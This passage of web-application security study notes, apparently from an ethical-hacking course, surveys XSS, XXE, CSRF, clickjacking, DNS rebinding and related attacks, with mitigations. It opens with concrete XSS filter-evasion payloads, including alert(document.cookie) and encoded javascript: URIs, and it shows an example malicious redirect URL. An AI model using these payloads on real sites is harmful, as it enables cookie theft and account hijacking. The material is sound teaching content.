						- ASCII Encoding: <a href="&#106;javascript:alert('XSS Successful')">Click Here!</a>
						- Hexadecimal Encoding: <a href="&#6A;javascript:alert(document.cookie)">Click Here!</a>
						- Base64 Encoding: <body onload="eval(atob('U3VjY2Vzc2Z1bCBYU1M='))">
						- Character Code Manipulation: <a href="&#x6A;javascript&#0000058&#0000097lert('Successful XSS')">Click Here!</a>
					- Embedding Whitespace Characters:
						- Browsers ignore whitespace characters in JavaScript or HTML, allowing attackers to break up keywords to avoid detection.
						- Tab Space Encoding: <img src="java script:al ert ('Successful XSS')">
						- Newline Character Encoding: <a href="jav&#x0A;a Script:&#x0A;ale&#x0Drt;('XSS Attack')">Visit xyz.com</a>
					- Manipulating Tags and Attributes:
						- Attackers obfuscate scripts by nesting <script> tags within other tags or breaking attribute values.
						- Tag Manipulation: <scr<script>ipt>document.write("Successful XSS")</scr<script>ipt>
						- Bypassing Whitespace Restrictions: <img/src="popup.jpg"onload=&#x6A;avascript:eval(alert('XSS Attack!'))>
						- Skipping <href> Attributes: <a onmousedown="alert(document.cookie)">Visit xyz.com</a>
			- Conclusion: XSS attacks exploit vulnerabilities in web applications to steal data, hijack sessions, and execute malicious actions on users' browsers. Attackers continuously develop evasion techniques to bypass security filters, making proper input validation, encoding, and browser security configurations essential for preventing XSS attacks.
		- Web-Based Timing Attacks:
			- A web-based timing attack is a type of side-channel attack in which attackers retrieve sensitive information, such as passwords, from web applications by measuring the server's response time. These attacks exploit side-channel leakage and estimate the time taken for secret key operations. Different types of web-based timing attacks include direct timing attacks, cross-site timing attacks, and browser-based timing attacks.
			- Direct Timing Attack:
				- Direct timing attacks are carried out by measuring the approximate time taken by the server to process a POST request, which allows attackers to deduce the existence of a username. Similarly, attackers perform character-by-character password examination and exploit timing information to determine where the password comparison failed. Using this data, attackers can eventually reconstruct the target user’s password.
			- Cross-Site Timing Attack:
				- A cross-site timing attack is another type of timing attack in which attackers send crafted request packets to a website using JavaScript. Unlike a direct timing attack, where the attacker manually sends a request to a website, the attacker in a cross-site timing attack relies on the victim’s browser to send the request. The attacker then analyzes the time it takes for the victim’s browser to download a requested file.
				- For instance, consider a website http://xyz.com that contains two separate groups: /the-prompt/ and /the-anonymous-place/, with access restricted to group members. If an unauthorized user attempts to access a group, an error message is generated. When a victim visits a malicious website containing attacker-injected JavaScript, the attacker can measure response times to determine which group the victim belongs to, violating their privacy.
			- Browser-Based Timing Attacks:
				- Browser-based timing attacks are more sophisticated side-channel attacks. Instead of relying on unstable download times, attackers exploit side-channel leaks within the browser to estimate the time taken to process requested resources. The timing estimation begins immediately after the resource download starts and stops once processing is complete. Attackers can abuse different browser functionalities to launch further attacks, such as video parsing attacks and cache storage timing attacks.
				- Video Parsing Attack:
					- In a video parsing attack, attackers trick the browser into treating a non-video resource as a video. The browser attempts to parse the resource, eventually triggering an error when it realizes the file format is invalid. By measuring the time taken for this process, attackers can infer details about the requested resource.
					- Unlike cross-site timing attacks, this method begins measuring time when the suspend event is triggered—either because the resource is too small to be a valid video or because the download has completed. When the browser detects that the resource is not a valid video format (e.g., HTML or JSON files), it triggers an error event. By analyzing the time taken for this process, attackers can make inferences about the resource type and its size.
				- Cache Storage Timing Attack:
					- The Cache API allows developers to store, retrieve, and delete responses, providing access to cached resources. Since loading resources from disk takes time based on the file size, attackers can estimate this time to determine the response size.
			- After measuring the time taken for processing using the techniques mentioned above, attackers can launch additional attacks, such as brute-force attacks, to extract more information.
		- XML External Entity (XXE) Attack:
			- An XML External Entity (XXE) attack is a type of Server-Side Request Forgery (SSRF) attack that occurs when an application parses XML input from an untrusted source due to a misconfigured XML parser. In this attack, an attacker sends malicious XML input containing a reference to an external entity to the target web application. If the application uses a weakly configured XML parser, it processes the malicious input and allows the attacker to access protected files and services on the server or connected networks.
			- Since XML has widely available features, attackers abuse these capabilities to dynamically create documents or files during the parsing process. XXE attacks can be highly damaging, allowing attackers to:
				- Retrieve confidential data (e.g., sensitive system files).
				- Perform Denial-of-Service (DoS) attacks by causing resource exhaustion.
				- Extract sensitive information via HTTP(S) requests.
				- Execute remote code in some severe cases.
				- Launch Cross-Site Request Forgery (CSRF) attacks against vulnerable services.
			- According to the XML 1.0 standard, XML documents often use entities, which are defined as storage units. Entities in XML can refer to both local and remote content and can be declared using system identifiers (e.g., Uniform Resource Identifiers, or URIs). These system identifiers allow XML processors to access and parse external resources.
			- During XML parsing, the processor replaces these entities with their actual content. Attackers exploit this mechanism by manipulating external entity declarations, forcing the XML parser to access and disclose files or content specified by the attacker.
			- This vulnerability is particularly dangerous because trusted applications processing XML documents can be exploited to pivot through internal systems and extract sensitive internal data.
		- Unvalidated Redirects and Forwards:
			- Unvalidated redirects enable attackers to install malware or deceive victims into disclosing passwords or other sensitive information, while unsafe forwards may allow attackers to bypass access controls.
			- Attackers often exploit unvalidated redirects by sending malicious links to victims, luring them into clicking. Once clicked, the victim is redirected to a fraudulent or malicious website. These redirects can lead to:
				- The installation of malware on the victim’s device.
				- Credential theft, where victims unknowingly enter passwords on phishing sites.
			- Similarly, unsafe forwards are used by attackers to bypass security checks, gaining unauthorized access to restricted areas.
			- Consequences of Unsafe Forwarding:
				- Unsafe forwarding may lead to various security vulnerabilities, including:
				- Session Fixation Attack:
					- In a session fixation attack, an attacker tricks a user into accessing a legitimate web server using an explicit session ID. This allows the attacker to hijack the user’s session and gain unauthorized access.
				- Security Management Exploits:
					- Attackers can manipulate security management systems within networks or applications. By exploiting these systems, attackers can:
					- Modify or disable security policies.
					- Add, delete, or alter existing policies.
					- Gain unauthorized access to applications, system data, and resources.
				- Failure to Restrict URL Access:
					- Many web applications protect sensitive functionality by hiding certain URLs or links from users. However, attackers can often directly access these URLs and perform unauthorized actions by entering them manually.
				- Malicious File Execution:
					- Many applications are vulnerable to malicious file execution, primarily due to unvalidated input on web servers. Attackers exploit this to:
					- Execute and process files on the server.
					- Perform remote code execution.
					- Install rootkits remotely.
					- Gain complete control over a system.
			- How Unvalidated Redirects and Forwards Work:
				- Unvalidated Redirect Example:
					- A user receives a phishing email from an attacker containing a malicious link. The URL appears to be legitimate because it starts with: www.certifiedhacker.com
					- However, the latter part of the URL contains a malicious redirect to: www.evilserver.com
					- When the user clicks the link, they are redirected to the malicious website, where the attacker can:
						- Harvest credentials
						- Deploy malware
						- Perform other malicious activities
				- Unvalidated Forward Example:
					- An attacker exploits unvalidated forwarding to access restricted pages. The attacker sends a crafted request such as: http://www.certifiedhackershop.com/purchase.jsp?fwd=admin.jsp
					- If the server does not validate the request, it forwards the attacker to the admin page, granting unauthorized access to:
						- Purchase records
						- Registered users
						- Other sensitive data
			- Types of Redirection Attacks:
				- Open Redirection:
					- Open redirection occurs when attackers modify URL parameters to redirect users from a trusted website to a malicious one. Attackers use this technique for:
					- Phishing attacks, where users enter credentials on a fake login page.
					- Credential theft and cross-site scripting (XSS) attacks.
					- These attacks exploit vulnerabilities in the legitimate website, allowing attackers to forge URLs and inject malicious scripts using JavaScript or PHP.
				- Header-Based Open Redirection:
					- This attack involves modifying the HTTP location header to redirect users to a malicious page without their knowledge. This method is often used when JavaScript-based redirection is disabled or blocked.
					- Users should always verify the full URL before clicking on any link or requesting a resource.
				- JavaScript-Based Open Redirection:
					- This technique involves injecting JavaScript code into the webpage response received from a server. It is commonly used in phishing scams, tricking users into navigating to malicious websites unknowingly.
		- Magecart Attack:
			- A Magecart attack, also known as web skimming, occurs when an attacker injects malicious code into a website to steal sensitive customer data during an online transaction. This stolen data—such as credit card details, usernames, and addresses—can be used for:
				- Credit card fraud
				- Identity theft
				- Selling data on the dark web
				- Launching further cyberattacks
			- Attackers may also use the compromised website to spread malware or initiate additional attacks.
			- Steps in Magecart Attack:
				- Identifying a Target – The attacker scans an e-commerce website for vulnerabilities in outdated software or third-party plugins to gain unauthorized access.
				- Injecting Malicious Code – After breaching the website, the attacker embeds a malicious JavaScript (JS) script into the checkout page.
				- Data Skimming During Checkout – When users enter their payment details, the injected script captures and transmits the data to a remote server controlled by the attacker.
				- Exploiting Stolen Data – The attacker uses or sells the stolen card details for fraudulent transactions.
		- Watering Hole Attack:
			- A watering hole attack is a targeted cyberattack where an attacker infects a website frequently visited by a specific individual or organization. This method allows the attacker to exploit vulnerabilities and deliver malware to unsuspecting victims.
			- The name “watering hole attack” comes from the way predators wait at a watering hole to ambush prey—similarly, attackers wait for victims to visit compromised websites.
			- How Watering Hole Attack Works:
				- Identifying the Target – The attacker researches the target company or individual to determine frequently visited websites.
				- Scanning for Vulnerabilities – The attacker analyzes these websites for security flaws in their software or plugins.
				- Injecting Malicious Code – Once a vulnerability is found, the attacker injects malware into the website’s web pages or scripts.
				- Luring the Victim – The attacker waits for the victim to visit the compromised website.
				- Delivering Malware – When the victim accesses the infected site, the malicious script may:
					- Redirect the victim to a fraudulent website.
					- Silently download malware onto the victim’s device.
				- Compromising the Organization – Once the malware infects the victim’s device, the attacker gains a foothold in the network, potentially leading to data breaches, espionage, or further exploitation.
		- Cross-Site Request Forgery (CSRF) Attack:
			- Cross-Site Request Forgery (CSRF), also known as a one-click attack, occurs when an attacker tricks a user’s web browser into sending an unauthorized request to a trusted website without the user’s knowledge. Finance-related websites are particularly vulnerable to CSRF attacks due to their reliance on authenticated user sessions.
			- How CSRF Attacks Work:
				- User Authentication – The victim logs into a trusted website and maintains an active session.
				- Malicious Site Visit – The victim unknowingly visits a malicious web page controlled by the attacker.
				- Execution of Malicious Request – The malicious site injects an HTTP request into the victim's session with the trusted site.
				- Unauthorized Actions – The trusted site processes the request as if it were from the authenticated user, leading to unauthorized actions such as:
					- Transferring funds
					- Changing email or password
					- Modifying account settings
			- Why CSRF Attacks Are Dangerous:
				- Exploits Trusted Sessions – The attack occurs without requiring user credentials, leveraging the victim’s existing authentication.
				- Difficult to Detect – Since the request appears legitimate, security systems may not recognize it as an attack.
				- Bypasses Network Restrictions – Attackers use CSRF to target corporate intranets, bypassing firewalls and access controls.
			- Example Scenario:
				- A user logs into their banking website and keeps the session active.
				- The user clicks on a malicious link embedded in an email or website.
				- The link executes a hidden request, such as transferring money to the attacker’s account.
				- Since the user is already authenticated, the bank processes the request without suspicion.
			- Preventing CSRF Attacks:
				- Use CSRF Tokens – Implement anti-CSRF tokens to validate every request.
				- Enforce Same-Site Cookies – Restrict cookies from being sent with cross-site requests.
				- Require Re-Authentication – Ask users to confirm sensitive actions with a password or OTP.
				- Implement Content Security Policy (CSP) – Prevent unauthorized script execution.
		- Cookie/Session Poisoning:
			- Cookies play a crucial role in maintaining sessions between web applications and users by storing session-specific data such as user IDs, passwords, account numbers, shopping cart details, and session tokens. However, attackers can manipulate or modify cookie data to escalate privileges, assume another user’s identity, or inject malicious content. This attack, known as cookie/session poisoning, can compromise user privacy and application security.
			- How Cookie Poisoning Works:
				- Web applications store session-related data in cookies on the client-side (user’s browser or device).
				- An attacker intercepts or modifies these cookies using a proxy, browser tools, or scripts.
				- The attacker injects altered data (e.g., modifying user roles, credentials, or session IDs).
				- The compromised cookie is sent back to the server, which processes it as if it were from the legitimate user.
				- The attacker gains unauthorized access, allowing them to steal data, make fraudulent transactions, or alter user sessions.
			- Types of Cookies and Their Risks:
				- Persistent Cookies – Stored on disk; can be stolen or modified if not properly secured.
				- Non-Persistent (Session) Cookies – Stored in memory; expire when the session ends but still vulnerable to interception.
				- Secure Cookies – Transmitted only over SSL/TLS; safer but still susceptible to attacks if improperly implemented.
				- Non-Secure Cookies – Transmitted over unencrypted HTTP; highly vulnerable to theft and manipulation.
			- Threats of Cookie Poisoning:
				- Account Takeover – Attackers can hijack a user’s session, gaining unauthorized access to sensitive data.
				- Identity Theft – Malicious users can assume another person’s online identity.
				- Data Manipulation – Attackers can modify cookie values to alter account balances, permissions, or purchase histories.
				- Service Exploitation – Attackers can access premium content or restricted features without authorization.
			- Example Scenario:
				- A website offers a “Remember Me” option, storing login credentials in a cookie.
				- An attacker modifies the cookie to change the user ID or privileges.
				- The compromised cookie is sent to the server, granting unauthorized access to another user's account.
			- Preventing Cookie Poisoning:
				- Use HTTPOnly and Secure Flags – Prevent JavaScript-based access and enforce secure transmission.
				- Encrypt Cookie Data – Implement strong encryption instead of reversible encoding (e.g., Base64 or ROT13).
				- Validate and Sanitize Cookies – Ensure that the server verifies and rejects altered cookie values.
				- Enable Session Expiry – Implement short-lived session tokens to minimize risk.
				- Use Strong Authentication – Require multi-factor authentication (MFA) to prevent unauthorized access.
		- Insecure Deserialization:
			- Computers store data in structured formats such as graphs, trees, and arrays. Serialization and deserialization are essential processes for converting these data structures into a linear format for transportation across networks or systems.
			- Serialization:
				- Serialization is the process of converting an object into a linear data format so it can be stored or transmitted.
				- Example: Consider a Java-based object named "Employee", which contains attributes such as Name, Age, City, and Employee ID. During serialization, this object is converted into an XML-based string for transmission:
					<Employee>
						<Name>Rinni</Name>
						<Age>26</Age>
						<City>Nevada</City>
						<EmpID>2201</EmpID>
					</Employee>
			- Deserialization:
				- Deserialization is the reverse process of serialization, where the linear data is reconstructed into its original object format. The serialized Employee object shown above would be converted back into a Java object with its original attributes.
			- Insecure Deserialization:
				- While serialization and deserialization are widely used in network communications and data storage, flaws in the process can be exploited by attackers.
				- Attack Process:
					- An attacker injects malicious code into serialized data.
					- The modified data is sent to the target system.
					- When the system deserializes the data, it unknowingly executes the malicious code.
				- Example of Malicious Serialized Data:
					<Employee>
						<Name>Rinni</Name>
						<Age>26</Age>
						<City>Nevada</City>
						<EmpID>2201</EmpID>
						<Malicious>EXECUTE PAYLOAD</Malicious>
					</Employee>
				- Since deserialization processes often lack validation, the malicious payload remains undetected and gets executed, allowing attackers to run arbitrary code remotely.
				- Impact of Insecure Deserialization:
					- Remote Code Execution (RCE) – Attackers can gain complete control over the system.
					- Privilege Escalation – Unauthorized users can elevate their access rights.
					- Data Breach – Sensitive data can be extracted and exploited.
					- Denial of Service (DoS) – Attackers can crash applications by injecting malformed or recursive objects.
					- Server Compromise – Affected software or servers can become entry points for further attacks.
				- Mitigation Strategies:
					- Disable Deserialization for Untrusted Data – Do not deserialize data from unverified sources.
					- Use Secure Serialization Libraries – Prefer safer alternatives that enforce strict validation.
					- Validate Input Data – Implement strict input validation to prevent injection attacks.
					- Implement Signature-Based Integrity Checks – Verify serialized data integrity using cryptographic signatures.
					- Use Sandboxing and Least Privilege – Run deserialization in an isolated, restricted environment to limit damage.
		- Web Service Attacks:
			- Web services enable direct interaction with web applications without requiring a browser or user session. As businesses increasingly rely on web services, they introduce new attack vectors that can be exploited by cybercriminals.
			- Web services are built using XML-based protocols, such as:
				- Web Services Description Language (WSDL) – Defines connection points for web services.
				- Universal Description, Discovery, and Integration (UDDI) – Facilitates the discovery of available web services.
				- Simple Object Access Protocol (SOAP) – Enables communication between web services.
			- These protocols, while essential for functionality, can be vulnerable to web application threats. Since web service definitions are publicly available, attackers can analyze them to fingerprint the system and craft targeted attacks.
			- Examples of Web Service Attacks:
				- Injection Attack:
					- An attacker injects a malicious script into a web service, allowing them to disclose or modify application data.
				- Order Manipulation Attack:
					- An attacker exploits a web service used for processing orders.
					- They manipulate the request payload to modify the order quantity and status.
					- For example, an attacker orders 10 units of a product but injects a script that modifies the confirmation page to reflect a smaller quantity (e.g., 2 units).
					- The system processes the order and ships 10 units, but the records show only 2 units were shipped—allowing the attacker to receive more products than they paid for.
			- Mitigation Strategies:
				- Input Validation & Sanitization – Prevent injection attacks by validating all inputs in web services.
				- Secure API Authentication & Authorization – Implement strong authentication methods (e.g., OAuth, API keys).
				- Use XML Security Best Practices – Prevent XML External Entity (XXE) attacks and SOAP-based exploits.
				- Monitor and Log API Activity – Track suspicious behavior and block malicious requests in real time.
		- Web Service Footprinting Attack:
			- Attackers use the Universal Business Registry (UBR) as a key resource for gathering information about web services. UBR is a public registry that operates based on UDDI (Universal Description, Discovery, and Integration) specifications and SOAP (Simple Object Access Protocol). It functions similarly to a Whois server, allowing attackers to extract valuable data about registered businesses and their web services.
			- UDDI Information Structures:
				- When registering web services on a UDDI server, businesses or organizations typically use the following structures:
				- businessEntity: Contains company details, including the business name and contact information.
				- businessService: Represents a logical group of one or more web services. Each businessService is a subset of a businessEntity and provides technical and descriptive details about the web services.
				- bindingTemplate: Defines a single web service and includes technical details required for client applications to bind and interact with the service. It is a subset of businessService.
				- technicalModel (tModel): Acts as keyed metadata that represents unique concepts or constructs within UDDI.
			- By footprinting a web application, attackers can extract any or all of these UDDI structures to map the target's web services environment and plan further attacks.
			- Example of Web Service Footprinting via XML Query and XML Response:
				- Attackers often send XML queries to UDDI servers to extract information about web services. The example of an XML request sent via SOAP to query information about Amazon's web services. If the target system is vulnerable, the attacker receives a response containing detailed information about the web services associated with the queried business (e.g., Amazon). XML Response (Data Extracted by Attacker).
			- Key Takeaways:
				- Attackers can extract sensitive web service details using UDDI-based footprinting techniques.
				- Exposed UDDI service structures (businessEntity, businessService, bindingTemplate, tModel) provide attackers with reconnaissance data.
				- If security measures are not in place, attackers can gather technical data on web services and craft more advanced exploits.
			- Mitigation Strategies:
				- Restrict UDDI Access – Ensure UDDI registries are private or require authentication to prevent unauthorized access.
				- Implement Secure API Gateways – Use API authentication mechanisms (e.g., OAuth, API keys) to restrict queries.
				- Disable Unused Web Services – Prevent exposure of unnecessary services that could be exploited.
				- Monitor and Log Web Service Queries – Track suspicious access patterns and block unauthorized footprinting attempts.
		- Web Service XML Poisoning:
			- XML poisoning is similar to an SQL injection attack but has a higher success rate in a web service framework. Attackers insert malicious XML code into SOAP requests to perform XML node manipulation or XML schema poisoning, which can disrupt XML parsing logic and break execution processes.
			- By exploiting XML external entity (XXE) references, attackers can gain unauthorized access to arbitrary files, establish TCP connections, and execute further web service attacks. XML poisoning enables attackers to:
				- Launch Denial-of-Service (DoS) attacks by overloading XML parsers.
				- Compromise sensitive information by manipulating XML-based data exchanges.
				- Disrupt web services by altering parsing mechanisms such as SAX (Simple API for XML) and DOM (Document Object Model).
			- Since web services rely on XML for data exchange, attackers can poison traffic between servers and applications by injecting malicious XML documents to alter data processing and execution flows.
			- Example: XML Request vs. Poisoned XML Request
				- Legitimate XML Request:
					- The following valid XML request is used to retrieve customer records:
						<CustomerRecord>
							<CustomerNumber>2010</CustomerNumber>
							<FirstName>Jason</FirstName>
							<LastName>Springfield</LastName>
							<Address>Apt 20, 3rd Street</Address>
							<Email>jason@springfield.com</Email>
							<PhoneNumber>6325896325</PhoneNumber>
						</CustomerRecord>
				- Poisoned XML Request:
					- In a malicious attack, the attacker injects duplicate or malformed XML nodes, potentially confusing the server's XML parser and causing unexpected behavior or security vulnerabilities:
						<CustomerRecord>
							<CustomerNumber>2010</CustomerNumber>
							<FirstName>Jason</FirstName>
							<CustomerNumber>2010</CustomerNumber>
							<FirstName>Jason</FirstName>
							<LastName>Springfield</LastName>
							<Address>Apt 20, 3rd Street</Address>
							<Email>jason@springfield.com</Email>
							<PhoneNumber>6325896325</PhoneNumber>
						</CustomerRecord>
			- Impact of XML Poisoning Attacks:
				- Bypassing authentication – Attackers may manipulate XML structures to trick authentication mechanisms.
				- Data manipulation – Attackers alter request data to modify transactions or extract confidential information.
				- Denial-of-Service (DoS) – XML schema manipulation can crash servers by overloading parsers.
				- External entity injection (XXE attacks) – Malformed XML can be used to access restricted files or open TCP connections.
			- Mitigation Strategies:
				- Use Secure XML Parsers – Implement XML libraries that disable external entity processing (XXE).
				- Validate XML Schema – Ensure that XML requests strictly follow a defined schema and reject malformed requests.
				- Sanitize User Input – Filter out unexpected XML elements and validate all input before processing.
				- Limit XML Depth and Size – Restrict nested XML elements and set size limits to prevent DoS attacks.
				- Use Strong Authentication – Ensure that web services require authentication tokens to verify requests.
		- DNS Rebinding Attack:
			- Attackers use DNS rebinding to bypass the Same-Origin Policy (SOP), a security mechanism that restricts web pages from making arbitrary requests to local or private network resources.
			- For example, when an employee within an organization accesses the internal private network, external websites cannot directly communicate with it due to SOP restrictions. Attackers exploit DNS rebinding to circumvent these security measures, enabling them to interact with internal services as if they were legitimate local users.
			- How DNS Rebinding Works:
				- Attacker Registers a Malicious Domain:
					- The attacker creates a malicious website (e.g., certifiedhacker.com) and registers it with a DNS server under their control.
					- The DNS server is configured to return short Time-to-Live (TTL) values, preventing DNS responses from being cached.
				- Victim Accesses the Malicious Website:
					- The victim visits http://certifiedhacker.com, and the attacker’s DNS server resolves the domain to an IP address hosting the malicious website.
					- The attacker’s web server responds with a web page containing JavaScript code that runs in the victim’s browser.
				- DNS Rebinding to Bypass SOP:
					- The JavaScript requests additional resources from http://certifiedhacker.com/secret.html.
					- Due to the short TTL, the victim's browser makes a new DNS request for certifiedhacker.com.
					- This time, the attacker’s DNS server responds with an internal/private IP address (e.g., xyz.com’s internal IP).
					- The browser, assuming it is still communicating with certifiedhacker.com, loads http://xyz.com/secret.html without triggering SOP restrictions.
			- By exploiting DNS rebinding, attackers can:
				- Access internal web applications and steal sensitive data.
				- Control IoT devices and internal APIs that rely on local networks.
				- Execute malicious scripts on the victim’s private network.
			- Mitigation Strategies:
				- Implement Network Segmentation – Prevent internal systems from making unnecessary outbound connections.
				- Enforce DNS Security Policies – Restrict domains with low TTL values to prevent DNS rebinding.
				- Use Web Proxy Restrictions – Block client-side scripts from accessing local IP addresses (e.g., 192.168.x.x).
				- Enable DNS Rebinding Protection – Configure firewalls, DNS servers, or routers to detect and block DNS rebinding attempts.
				- Implement Same-Site Cookies and CSRF Protections – Prevent unauthorized requests from untrusted origins.
		- Clickjacking Attack:
			- Clickjacking is a user interface (UI) redress attack where attackers trick victims into clicking on malicious web page elements that are transparently placed over a trusted website. This technique exploits HTML iframes and misconfigured X-Frame-Options headers, allowing attackers to manipulate user interactions.
			- How Clickjacking Works:
				- Loading the Target Website in an iframe – The attacker embeds the target website inside a low-opacity iframe, making it appear as part of the attacker's web page.
				- Creating a Deceptive UI – The attacker positions invisible or misleading elements (e.g., buttons, forms) over legitimate UI components.
				- Tricking the Victim into Clicking – The victim unknowingly clicks on the invisible, malicious elements, triggering actions such as:
					- Injecting malware
					- Stealing login credentials
					- Transferring funds
					- Making unauthorized purchases
			- Attackers distribute clickjacking attack links via email, social media, or malicious websites to lure victims into interacting with the compromised page.
			- Clickjacking Techniques:
				- Attackers use various techniques to manipulate user clicks and bypass security controls:
				- Complete Transparent Overlay:
					- The trusted page is fully overlaid on a malicious page within an invisible iframe.
					- A higher z-index value positions the malicious UI elements above the real page.
				- Cropping:
					- Only specific controls from the legitimate page are overlaid.
					- Attackers mask buttons with fake hyperlinks, alter button labels, or replace text with misleading information.
				- Hidden Overlay:
					- An invisible iframe (1×1 pixel size) is placed under the victim's mouse cursor.
					- When the victim clicks, the event is registered on the attacker's page instead of the real page.
				- Click Event Dropping:
					- A malicious page is hidden behind a legitimate page, but clicks pass through due to CSS pointer-events: none.
					- Victims interact only with the attacker's hidden content while believing they are interacting with a safe page.
				- Rapid Content Replacement:
					- Attackers cover targeted elements with opaque overlays.
					- The overlay is removed just before the victim clicks, ensuring the malicious click is registered.
			- Mitigation Strategies:
				- Use X-Frame-Options Headers – Set DENY or SAMEORIGIN to prevent iframe embedding.
				- Enable Content Security Policy (CSP) – Restrict iframe usage with the frame-ancestors directive.
				- Implement Click Confirmation – Require user interaction (e.g., CAPTCHA, pop-ups) before performing sensitive actions.
				- Use JavaScript Frame-Busting Techniques – Detect and prevent unauthorized iframe embedding.
				- Regularly Audit Web Applications – Identify iframe vulnerabilities and improper configurations.
		- MarioNet Attack:
			- MarioNet is a browser-based attack that executes malicious code inside a victim's browser and persists even after the user closes the malicious webpage. Unlike traditional browser-based threats, MarioNet can continue running in the background, leveraging modern browser APIs.
			- How the MarioNet Attack Works:
				- Exploiting the Service Workers API:
					- Most modern web browsers support the Service Workers API, which allows web applications to perform background tasks without affecting the UI.
					- Attackers abuse this feature by registering and activating a malicious service worker through a compromised or attacker-controlled website.
				- Persistent Execution Even After Tab Closure:
					- Once activated, the service worker runs in the background, even after the user closes the browser tab.
					- Attackers abuse the Service Workers SyncManager interface to ensure the malicious service remains active, even after tab crashes or power failures.
				- Turning the Browser into a Botnet Node:
					- MarioNet leverages JavaScript and existing HTML5 APIs to hijack browser resources for malicious activities, including:
					- Cryptojacking – Mining cryptocurrency without the user’s knowledge.
					- DDoS Attacks – Using infected browsers to launch large-scale denial-of-service attacks.
					- Click Fraud – Generating fraudulent ad clicks for financial gain.
					- Distributed Password Cracking – Utilizing browser resources for brute-force attacks.
				- Injecting Malicious Code into High-Traffic Websites:
					- Attackers can compromise legitimate, high-traffic websites and inject MarioNet malware for a short period, allowing them to:
					- Steal user credentials and sensitive data.
					- Gain control over compromised browsers via a central command-and-control (C2) server.
			- Mitigation Strategies:
				- Restrict Service Workers Permissions – Disable or restrict untrusted websites from registering service workers.
				- Implement Content Security Policy (CSP) – Use strict CSP rules to prevent unauthorized script execution.
				- Regularly Clear Browser Data – Deleting service workers in browser settings can remove persistent threats.
				- Enable Browser Security Features – Use extensions or built-in browser settings to block unwanted background scripts.
				- Educate Users on Malicious Websites – Warn users about clicking unknown links or visiting suspicious sites.
		- Cookie Snooping:
			- Attackers use cookie snooping to analyze a victim’s browsing habits. The collected data may be sold to third parties or used to launch further attacks on the victim’s web applications.
		- RC4 NOMORE Attack:
			- The Rivest Cipher Numerous Occurrence Monitoring and Recovery Exploit (RC4 NOMORE) attack targets the RC4 stream cipher, which is used in some web servers for encryption. Attackers exploit vulnerabilities in RC4-based encryption to decrypt web cookies secured by HTTPS and inject arbitrary packets. By stealing a valid session cookie, the attacker can impersonate the victim, log into their accounts, and perform unauthorized transactions.
		- Buffer Overflow:
			- A buffer overflow vulnerability occurs when a web application fails to properly manage its memory buffer, allowing data to be written beyond its allocated space. This can result in application crashes, arbitrary code execution, or privilege escalation.
		- Business Logic Bypass Attack:
			- A business logic bypass attack targets the intended functionality of a web application rather than exploiting traditional software vulnerabilities. Attackers manipulate the application’s workflow or business rules to achieve unauthorized access, data leakage, or fraudulent activities.
		- CAPTCHA Attacks:
			- CAPTCHAs are challenge-response tests used by web applications to distinguish between human users and automated bots. However, attackers use various techniques, such as machine learning, OCR (Optical Character Recognition), or CAPTCHA farms, to bypass these protections.
		- Platform Exploits:
			- Web applications are built on platforms such as BEA WebLogic and ColdFusion, each of which has its own set of vulnerabilities. Attackers exploit these platform-specific weaknesses to compromise applications, steal data, or escalate privileges.
		- Denial-of-Service (DoS) Attack:
			- A DoS attack aims to disrupt the availability of a service, restricting access to system resources for legitimate users. For example, an attacker may overload a banking or email service, rendering it unusable for hours or even days, resulting in financial and operational losses.
		- H2C Smuggling Attack:
			- An H2C Smuggling Attack targets HTTP/2 over TCP (H2C) connections in web applications that support both HTTP/1.1 and HTTP/2 protocols. Attackers craft malicious HTTP requests to bypass security controls, leading to cache poisoning, security control evasion, and unauthorized access to sensitive data.
		- JavaScript Hijacking:
			- Also known as JSON hijacking, this attack exploits same-origin policy flaws in web browsers to steal sensitive data from applications using JavaScript Object Notation (JSON). Attackers can trick a victim’s browser into executing malicious JavaScript code to extract confidential information.
		- Cross-Site WebSocket Hijacking (CSWH):
			- Cross-Site WebSocket Hijacking occurs when an attacker establishes a WebSocket connection with a vulnerable web application using the victim’s identity. If the WebSocket handshake relies solely on HTTP cookies (without CSRF tokens or additional security measures), attackers can hijack sessions, send arbitrary requests, and extract sensitive data.
		- Obfuscation Techniques:
			- Attackers often use obfuscation techniques to evade detection by intrusion detection systems (IDS). Common obfuscation methods include:
				- Unicode encoding
				- UTF-8 encoding
				- Base64 encoding
				- URL encoding
			- These techniques make malicious payloads harder to detect while ensuring they execute correctly on the target system.
		- Network Access Attacks:
			- Attackers use network access attacks to exploit weaknesses in a web application’s underlying network infrastructure. These attacks can lead to:
				- Service disruptions
				- Unauthorized access to internal systems
				- Data interception or modification
		- DMZ Protocol Attacks:
			- The demilitarized zone (DMZ) is a buffer network between an organization’s internal network and the internet. If an attacker compromises a DMZ system, they can potentially gain access to:
				- Web application data
				- Website defacement
				- Internal systems, including databases, backups, and source code
		- Injecting an SSRF Payload
		- Cross-Site Port Attack (XSPA)
- Web Application Hacking Methodology:
	- Attackers use the web application hacking methodology to gain knowledge of a specific web application and successfully compromise it. This methodology enables them to plan each step in detail, increasing their chances of a successful attack. If hackers bypass this structured process and attempt to exploit the web application directly, their chances of failure increase. As part of this approach, they take the following steps to gather detailed information about various resources needed to operate or access the web application:
	- Footprint Web Infrastructure:
		- Footprinting is the process of gathering comprehensive information about a system, its components, and how they function. The web infrastructure of a web application refers to how it connects to other systems, servers, and networks. Web infrastructure footprinting is the first step in web application hacking, helping attackers identify potential victims and vulnerable web applications. By analyzing the web infrastructure, attackers can determine how a web application interacts with its peers, the technologies it uses, and potential weaknesses within its architecture. Exploiting these vulnerabilities may allow attackers to gain unauthorized access to the web application.
		- Server Discovery:
			- The first step in web infrastructure footprinting is identifying active internet servers. Techniques such as Whois lookup, DNS interrogation, and port scanning help discover these servers and gather relevant information, including their locations and status. This process confirms whether a target server is live on the internet. Attackers use these methods to locate the physical servers hosting web applications, which can aid in identifying potential vulnerabilities.
			- Whois Lookup:
				- Whois lookup utilities provide information about a web server's IP address and DNS names. These tools allow you to gather details about a domain using DNS and Whois queries. The results are typically presented in an HTML report.
				- Whois Lookup Tools:
					- Netcraft (www.netcraft.com)
					- Whois Lookup (whois.domaintools.com)
					- Batch IP Converter (http://www.sabsoft.com)
					- Whois Domain Lookup (www.whois.com)
					- Whois (webwhois.verisign.com)
					- Whois Lookup (mxtoolbox.com)
			- DNS Interrogation:
				- DNS interrogation provides information about the locations and types of servers. Organizations use this process, which relies on a distributed database, to map IP addresses to hostnames and vice versa. If the DNS is misconfigured, it becomes easier for attackers to exploit it and gather information needed to launch an attack on a target organization.
				- DNS Interrogation Tools:
					- DNSRecon (github.com)
